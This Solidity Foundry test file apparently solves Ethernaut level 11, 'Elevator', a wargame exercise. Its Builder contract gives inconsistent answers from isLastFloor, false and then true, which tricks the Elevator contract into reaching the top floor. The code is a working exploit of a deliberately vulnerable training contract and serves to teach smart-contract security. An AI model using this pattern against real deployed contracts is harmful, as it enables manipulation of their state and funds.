// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_11/Elevator.sol";

contract ElevatorTest is Test {
    Elevator elevator;
    Builder builder;

    function setUp() public {
        elevator = new Elevator();
        builder = new Builder();
    }

    function testAttack() public {
        vm.prank(address(builder));
        elevator.goTo(1);
        elevator.top();
    }
}

contract Builder is Building {
    uint256 count = 0;

    function isLastFloor(uint256 num) external returns (bool) {
        if (count == 1) {
            return true;
        }
        count++;
        return false;
    }
}
